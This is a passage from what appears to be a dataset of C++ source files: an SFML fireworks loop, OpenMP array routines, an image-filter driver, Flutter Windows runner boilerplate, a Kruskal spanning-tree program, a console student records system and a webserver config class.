}\n\n                    current.Position += current.Velocity * dt;\n\n                    blastBoom.setRadius(current.Radius);\n                    blastBoom.setFillColor(current.Color);\n                    blastBoom.setOrigin(sf::Vector2f(current.Radius, current.Radius));\n                    blastBoom.setPosition(current.Position);\n\n                    fadeTexture.draw(blastBoom);\n                }\n            }\n\n            for (size_t i = 0; i < FireWorksAftermath.size(); i++) { // this is for the blast effect\n                auto& current = FireWorksAftermath[i];\n\n                current.Velocity.y += gravity * dt;\n\n                current.Position += current.Velocity * dt;\n\n                current.Radius -= 10.0f * dt;\n                if (current.Radius <= 1.0f) {\n                    FireWorksAftermath.erase(FireWorksAftermath.begin() + i);\n                    i--;\n                    continue;\n                }\n\n                blastBoom.setRadius(current.Radius);\n                blastBoom.setFillColor(current.Color);\n                blastBoom.setOrigin(sf::Vector2f(current.Radius, current.Radius));\n                blastBoom.setPosition(current.Position);\n\n                fadeTexture.draw(blastBoom);\n            }\n\n            fadeTexture.display();\n\n            window.draw(sf::Sprite(fadeTexture.getTexture()));\n        }\n\n        //this is for fps kinda whack imo\n        frameCount++;\n        if (fpsClock.getElapsedTime().asSeconds() >= 1.0f) {\n            float fps = static_cast<float>(frameCount) / fpsClock.restart().asSeconds();\n            fpsText.setString(\"FPS: \" + std::to_string(static_cast<int>(fps)));\n\n            frameCount = 0;\n        }\n        window.draw(fpsText);\n\n        window.display();\n\n",
    "\ufeff#include<iostream>\n#include\"omp.h\"\n#include<thread>\n\nusing namespace std;\n\nconst int rows = 5000;\nconst int cols = 5000;\n\nconst int Treadds = 10;\n\nint MyArr[rows][cols];\n\nvoid init_arr();\n\nint FindMin();\n\nint FindSum();\nint FindSum(int);\n\nint main() {\n\n\tinit_arr();\n\n\tomp_set_nested(1);\n\tdouble t1 = omp_get_wtime();\n#pragma omp parallel sections\n\t{\n#pragma omp section\n\t\t{\n\t\t\tint d = FindSum();\n\t\t\tdouble t2 = omp_get_wtime();\n\n#pragma omp critical\n\t\t\t{\n\t\t\t\tstd::cout << d << endl;\n\t\t\t\tcout << t2 - t1 << endl;\n\t\t\t}\n\t\t}\n\n#pragma omp section\n\t\t{\n\t\t\tint d = FindMin();\n\t\t\tint dd = FindSum(d);\n\t\t\tdouble t2 = omp_get_wtime();\n#pragma omp critical\n\t\t\t{\n\t\t\t\tcout << dd << endl;\n\t\t\t\tcout << d << endl;\n\t\t\t\tcout << t2 - t1 << endl;\n\t\t\t}\n\t\t}\n\t}\n\treturn 2;\n}\n\nint FindSum()\n{\n\tint sum = 0;\n#pragma omp parallel for reduction(+:sum) num_threads(Treadds)\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tfor (int j = 0; j < cols; j++)\n\t\t{\n\t\t\tsum = sum + MyArr[i][j];\n\t\t}\n\t\t//std::this_thread::sleep_for(std::chrono::milliseconds(1));\n\t}\n\treturn sum;\n}\n\nint FindSum(int row)\n{\n\tint sum = 0;\n\tfor (int j = 0; j < cols; j++)\n\t{\n\t\tsum = sum + MyArr[row][j];\n\t}\n\n\nreturn sum;\n}\n\nint FindMin()\n{\n\tint IndexOfMin = rows - 1;\n#pragma omp parallel for num_threads(Treadds)\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tint t1 = FindSum(i);\n\t\t{\n\t\t\tif (t1 < FindSum(IndexOfMin))\n\t\t\t{\n#pragma omp critical\n\t\t\t\t{\n\t\t\t\t\tif (t1 < FindSum(IndexOfMin))\n\t\t\t\t\t{\n\n\t\t\t\t\t\tIndexOfMin = i;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t//std::this_thread::sleep_for(std::chrono::milliseconds(1));\n\t}\n\treturn IndexOfMin;\n}\n\n\nvoid init_arr() {\n\tfor (int j = 0; j < rows; j++)\n\t{\n\t\tfor (int i = 0; i < cols; i++) {\n\t\t\t//MyArr[j][i] = (i+1)*(j+1);\n\t\t\tMyArr[j][i] = rand()%100;\n\t\t}\n\t}\n}",
    "#include \"artist.h\"\r\n#include \"drawer.h\"\r\n#include \"parser.h\"\r\n#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n \r\nint main(int argc, char* argv[]) {\r\n\r\n\tif (argc != 4) {\r\n\t\tcout << \"argc is not 4, but \" << argc << endl;\r\n\t\tthrow;\r\n\t}\r\n\t// CREATE PARSER\r\n\tparser p;\r\n\t// LOAD IMAGE AND CONFIG\r\n\tvector<int> tokens = p.load_image(argv[1]);\r\n\tvector<string> configs = p.load_config(argv[2]);\r\n\r\nstring style_target = configs[0];\r\nstring drawer_target = configs[1];\r\nchar* path_output = argv[3];\r\nint width = tokens[0];\r\nint height = tokens[1];\r\nvector<int> vals = { tokens.begin() + 2, tokens.end() };\r\n\r\n// CREATE ARTIST\r\nartist* style;\r\nif (style_target == \"classic\") {\r\n\tstyle = new classic(width, height, vals);\r\n}\r\nelse if (style_target == \"iclassic\") {\r\n\tstyle = new iclassic(width, height, vals);\r\n}\r\nelse if (style_target == \"sobelx\") {\r\n\tstyle = new sobelx(width, height, vals);\r\n}\r\nelse if (style_target == \"sobely\") {\r\n\tstyle = new sobely(width, height, vals);\r\n}\r\nelse if (style_target == \"gradient\") {\r\n\tstyle = new gradient(width, height, vals);\r\n}\r\nelse {\r\n\tthrow;\r\n}\r\n\r\n// CREATE DRAWER\r\ndrawer* d;\r\nif (drawer_target == \"drawer\") {\r\n\td = new drawer(style);\r\n}\r\nelse if (drawer_target == \"upsample\") {\r\n\td = new upsample(style);\r\n}\r\nelse if (drawer_target == \"downsample\") {\r\n\td = new downsample(style);\r\n}\r\nelse if (drawer_target == \"scale\") {\r\n\tint scale_x = stoi(configs[2]);\r\n\tint scale_y = stoi(configs[3]);\r\n\td = new scale(style, scale_x, scale_y);\r\n}\r\nelse {\r\n\tthrow;\r\n}\r\n// PERFORM DRAWING\r\nstring output = d->draw();\r\ncout << output;\r\n// WRITE OUTPUT\r\np.write_result(path_output, output);\r\nreturn 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"asistant_bot\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_2_mei\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nclass Edge\r\n{\r\n\t\tint src;\r\n\t\tint weight;\r\n\t\tint dest;\r\n\tpublic:\r\n\t\tEdge()\r\n\t\t{\r\n\t\t\t\r\n\t\t}\r\n\t\tvoid setEdge(int s, int d, int w)\r\n\t\t{\r\n\t\t\tsrc = s;\r\n\t\t\tdest = d;\r\n\t\t\tweight = w;\r\n\t\t}\r\n\t\tstatic int findParent(int parent[], int v)\r\n\t\t{\r\n\t\t\tif(parent[v] == v)\r\n\t\t\t\treturn v;\r\n\t\t\treturn findParent(parent,parent[v]);\r\n\t\t}\r\n\t\tstatic void sort(Edge* edges, int e)\r\n\t\t{\r\n\t\t\tfor(int i = 0; i < e - 1; i++)\r\n\t\t\t\tfor(int j = i + 1; j < e; j++)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tif(edges[i].weight > edges[j].weight)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tEdge temp = edges[i];\r\n\t\t\t\t\t\t\tedges[i] = edges[j];\r\n\t\t\t\t\t\t\tedges[j] = temp;\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t}\r\n\r\n\t\tstatic Edge* kruskals(Edge* edges,int e,int v)\r\n\t\t{\r\n\t\t\tint* parent = new int[v];\r\n\t\t\tfor(int i = 0; i < v; i++)\r\n\t\t\t\tparent[i] = i;\r\n\r\n\t\t\tEdge* output = new Edge[v-1];\r\n\r\n\t\t\tint j = 0, i = 0;\r\n\t\t\t\r\n\t\t\twhile(j < v - 1)\r\n\t\t\t{\r\n\t\t\t\tint srcparent = findParent(parent,edges[i].src);\r\n\t\t\t\tint destparent = findParent(parent,edges[i].dest);\r\n\r\n\t\t\t\tif(srcparent != destparent)\r\n\t\t\t\t{\r\n\t\t\t\t\toutput[j++] = edges[i];\r\n\t\t\t\t\tparent[srcparent] = destparent;\r\n\t\t\t\t}\r\n\t\t\t\ti++;\r\n\t\t\t}\r\n\t\t\tint sum = 0;\r\n\t\t\tfor(int i = 0; i < v - 1; i++)\r\n\t\t\t\tsum+=output[i].weight;\r\n\r\n\t\t\tcout<<\"*****\"<<sum<<\"******\"<<endl<<endl;\r\n\r\n\t\t\treturn output;\r\n\t\t}\r\n\t\tstatic void showEdges(string names[],Edge* edges, int e)\r\n\t\t{\r\n\t\t\tcout<<\"\\tSource\\tDestination\\tWeight\"<<endl;\r\n\t\t\tfor(int i = 0; i < e; i++)\r\n\t\t\t\tcout<<\"\\t\"<<names[edges[i].src]<<\"\\t\"<<names[edges[i].dest]<<\"\\t\\t\"<<edges[i].weight<<endl;\r\n\t\t}\r\n\t\tfriend int search(string[] ,string, int);\r\n\r\n};\r\nint search(string names[], string n, int v)\r\n{\r\n\tfor(int i = 0; i < v; i++)\r\n\t\tif(names[i] == n)\r\n\t\t\treturn i;\r\n\treturn -1;\r\n\r\n}\r\nint main()\r\n{\r\n\tint e,v;\r\n\tcout<<\"How many Cities and Wire Lines : \";\r\n\tcin>>v>>e;\r\n\tstring names[v];\r\n\r\n\tcout<<\"Enter City Names : \";\r\n\tfor(int i = 0; i < v; i++)\r\n\t{\r\n\t\tcin>>names[i];\r\n\t}\r\n\r\n\r\n\tEdge* edges = new Edge[e];\r\n\tfor(int i = 0; i < e; i++)\r\n\t{\r\n\t\tcout<<\"Enter Source, Destination and Weight for \"<<i + 1<<\"th Edge : \";\r\n\t\tstring s,d;\r\n\t\tint w;\r\n\t\tcin>>s>>d>>w;\r\n\r\n\t\tint si = search(names,s,v);\r\n\t\tint di = search(names,d,v);\r\n\r\n\t\tedges[i].setEdge(si,di,w);\r\n\t}\r\n\tEdge::showEdges(names,edges,e);\r\n\tEdge::sort(edges,e);\r\n\tcout<<endl;\r\n\tEdge::showEdges(names,edges,e);\r\n\tcout<<endl;\r\n\tEdge* output = Edge::kruskals(edges,e,v);\r\n\tEdge::showEdges(names,output,v-1);\r\n\treturn 0;\r\n}",
    "//student management System.\r\n//all header files\r\n#include<iostream>\r\n#include<conio.h>\r\n#include<string.h>\r\n#include<iomanip>\r\n#include<windows.h>\r\n#include<fstream>\r\n#include<stdlib.h>\r\n#include<stdio.h>\r\nusing namespace std;\r\nclass student\r\n{\r\n    char name[30];\r\n    int Roll_no;\r\n    int age;\r\n    char Pname[30];\r\n    char stdn[10];\r\n    int busno;\r\n    string convert(string s)\r\n    {\r\n        for(int i=0;i<s.length();i++)\r\n        {\r\n            s[i]=toupper(s[i]);\r\n        }\r\n        return s;\r\n    }\r\npublic:\r\n    void intro(void);   // introduction of project.\r\n    void ccolor(int); //display colorful contain.\r\n    void loadingbar(void);   //simple loading bar.\r\n    void login(void); //simple login contain.\r\n    void getdata(void);   //Get all data from user.\r\n    void showdata(void);   //display all data .\r\n    void viewAlldata();     //display all data from files.\r\n    int storedata();        //store all data in a file\r\n    void searchData(char *);    //search a perticuler data.\r\n    void showsearch(void);      //display search.\r\n    void deleteData(char *);    //delete a data.\r\n    void updateData(char *);    //use to update a data.\r\n    student()\r\n    {\r\n        Roll_no=0;\r\n        age=0;\r\n        busno=0;\r\n        strcpy(name,\"no name\");\r\n        strcpy(Pname,\"no name\");\r\n        strcpy(stdn,\"not found\");\r\n    }\r\n\r\n};\r\nvoid student::ccolor(int clr){\r\n\tHANDLE  hConsole;\r\n\thConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\tSetConsoleTextAttribute(hConsole, clr);\r\n\r\n//the above code displays colorful background.\r\n}\r\nvoid student::loadingbar()\r\n{\r\n    for (int i=15;i<=100;i+=5)//increasing by  5 and start with 15\r\n        {\r\n        system(\"cls\");\r\n        ccolor(14);\r\n\t\tcout<<\"\\n\\n\\n\\n\\n\\n\\n\\t\\t\\t\";\r\n\t\tcout<<i<<\" %% Loading...\\n\\n\\t\\t\";\r\n\t\tcout<<\" \";\r\n\t\tfor (int j=0; j<i;j+=2){\r\n\t\t\tcout<<\" \";\r\n\t\t}\r\n\t\tSleep(50);  //sleep for 50 mile second\r\n\t\tif(i==90 || i==50 || i==96 || i==83){\r\n\t\t\tSleep(50);\r\n\t\t}\r\n\t}\r\n\tsystem(\"cls\");// clear the terminal\r\n}\r\nvoid student::intro()\r\n{\r\n    ccolor(433);\r\n    cout<<\"*****************************************************************\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"*************      STUDENT MONITORING SYSTEM       **************\"<<endl\r\n        <<\"*************             MADE BY MR.ASHFAQUE ALI      **********\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"_________________________________________________________________\\n\";\r\n        //simple introduction\r\n        getch();\r\n}\r\nvoid student::login()\r\n{\r\n    ccolor(14); // simple login with user_id and password\r\n    char ui[]=\"ASHFAQUE\";\r\n    char psw[]=\"3535\";\r\n    char gui[10],gpsw[10];\r\n    cout<<\"\\n\\t\\t______________________________\"<<endl\r\n        <<\"\\t\\t|ENTER USER ID:-|\";\r\n    cin>>gui;\r\n    cout<<\"\\n\\t\\t______________________________\"<<endl\r\n        <<\"\\t\\t|ENTER PASSWORD:-|\";\r\n    cin>>gpsw;\r\n    if(strcmp(ui,gui)!=0 && strcmp(psw,gpsw)==0)\r\n       {\r\n           ccolor(12);\r\n        cout<<\"\\t\\tINVALID UI AND PASSWORD:\";\r\n        getch();\r\n        exit(0);\r\n    }\r\n    else\r\n    {\r\n        cout<<\"\\t\\tLOGIN SUCSESSFULLY:-\\n\";\r\n    }\r\n}\r\nvoid student::getdata()\r\n{\r\n\r\n    fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT NAME :\";cin.getline(name,29);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT ROLL.NO :\";cin>>Roll_no;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT BUS NO :\";cin>>busno;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT AGE :\";cin>>age;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;fflush(stdin);\r\n   cout<<\"\\t* ENTER STUDENT FATHER NAME :\";cin.getline(Pname,29);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT STANDARD :\";cin.getline(stdn,9);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;fflush(stdin);\r\n\r\n}\r\nvoid student::showdata()\r\n{\r\n            cout<<\"\\t***************************************************\"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|NAME of the student is       |->    \"<<name<<\"   \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|Roll.NO of the student is    |->       \"<<Roll_no<<\"          \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|BUS.NO of the student is     |->       \"<<busno<<\"         \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"webapplicationdemo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   CFGcluster.cpp                                     :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: jaromero <jaromero@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2023/10/17 23:13:44 by jaromero          #+#    #+#             */\n/*   Updated: 2023/12/10 11:59:58 by jaromero         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"CFGcluster.hpp\"\n\nCFGcluster::CFGcluster(void)\n{\n    this->srvName.clear();\n    this->root.clear();\n    this->index.clear();\n    this->autoindex.clear();\n    this->allow_methods.clear();\n    this->retrn_page.clear();\n    this->errorPages.clear();\n    this->nbrErrorPages = 0;\n    this->client_max_body_size = 0;\n    this->listen = 0;\n    this->get = false;\n    this->post = false;\n    this->del = false;\n    this->def_server = false;\n    this->virtual_server = false;\n    this->retrn_page.clear();\n    this->retrn_number = 0;\n    this->retrn_state = false;\n    this->locations.clear();\n    this->cluster = NULL;\n}\n\nCFGcluster::CFGcluster(CFGcluster const &copy)\n{\n    this->srvName = copy.srvName;\n    this->root = copy.root;\n    this->index = copy.index;\n    this->autoindex = copy.autoindex;\n    this->allow_methods = copy.allow_methods;\n    this->retrn_page = copy.retrn_page;\n    this->errorPages = copy.errorPages;\n    this->nbrErrorPages = copy.nbrErrorPages;\n    this->client_max_body_size = copy.client_max_body_size;\n    this->listen = copy.listen;\n    this->get = copy.get;\n    this->post = copy.post;\n    this->del = copy.del;\n    this->def_server = copy.def_server;\n    this->virtual_server = copy.virtual_server;\n    this->retrn_page = copy.retrn_page;\n    this->retrn_number = copy.retrn_number;\n    this->retrn_state = copy.retrn_state;\n    this->locations = copy.locations;\n    this->nbr_location = copy.nbr_location;\n    this->cluster = copy.cluster;\n}\n\nCFGcluster::~CFGcluster()\n{\n}\n\nCFGcluster& CFGcluster::operator=(CFGcluster &pointer)\n{\n    this->srvName = pointer.getSrvNme();\n    this->root = pointer.getRoot();\n    this->index = pointer.getIndex();\n    this->autoindex = pointer.getAutoindex();\n    this->allow_methods = pointer.getAllowmethods();\n    this->listen = pointer.getListen();\n    this->allow_methods = pointer.getAllowmethods();\n    this->get = pointer.getGet();\n    this->post = pointer.getPost();\n    this->del = pointer.getDel();\n    this->client_max_body_size = pointer.getBodyBuffer();\n    this->nbr_location = pointer.getNbrLocation();\n    for(int i = 0; i < pointer.getNbrLocation(); i++)\n        this->locations.push_back(pointer.getLocations(i));\n    this->errorPages = pointer.errorPages;\n    this->cluster = pointer.cluster;\n    this->retrn_number = pointer.retrn_number;\n    this->retrn_page = pointer.retrn_page;\n    this->retrn_state = pointer.retrn_state;\n    this->cluster = pointer.cluster;\n    \n    return (*this);\n}\n\nvoid    CFGcluster::printLocation(void)\n{\n    int i;\n\n    i = 0;\n    while (i < this->nbr_location)\n    {\n        std::cout << \"--- location \" << i + 1 << \" ---\" << std::endl;\n        this->locations[i].printData();\n        i++;\n    }\n}\n\n/*---------- SETS -------------*/\n\nvoid    CFGcluster::SetSrvNme(std::string _name)\n{\n    this->srvName = _name;\n}\n\nvoid    CFGcluster::SetRoot(std::string _root)\n{\n    if (_root == \"\")\n        this->root = \"srcs/\";\n    else\n        this->root = _root;\n}\n\nvoid    CFGcluster::SetIndex(std::string _index)\n{\n    if (_index == \"\")\n        this->index = \"index.html\";\n    else\n        this->index = _index;\n}\n\nvoid    CFGcluster::SetAutoindex(std::string _autoindex)\n{\n    if (_autoindex == \"\")\n        this->autoindex = \"off\";\n    else\n        this->autoindex = _autoindex;\n}\n\nvoid    CFGcluster::SetAllowmethods(std::string _allowmethods)\n{\n    if (_allowmethods == \"\")\n        this->allow_methods = \"GET, POST, DELETE\";\n    else\n        this->allow_methods = _allowmethods;\n}\n\nvoid    CFGcluster::SetErrorPages(std::string data)\n{\n    std::string path;\n    int         i;\n    int         x;\n    int         error;\n\n    if (data == \"\")\n        return;\n    i = 0;\n    while (data[i] == ' ' || data[i] == '\\t')\n        i++;\n    x = i;\n    while(data[x] >= '0' && data[x] <= '9')\n        x++;\n    error = atoi(data.substr(i, x).c_str());\n    if (data[x] == ' ')\n    {\n        x++;\n        path = data.substr(x, (data.length() - x));\n        this->errorPages.insert(std::make_pair(error, path));\n    }\n}\n\nvoid    CFGcluster::SetNbrErrorPages(int data)\n{\n    this->nbrErrorPages = data;\n}\n\nvoid",
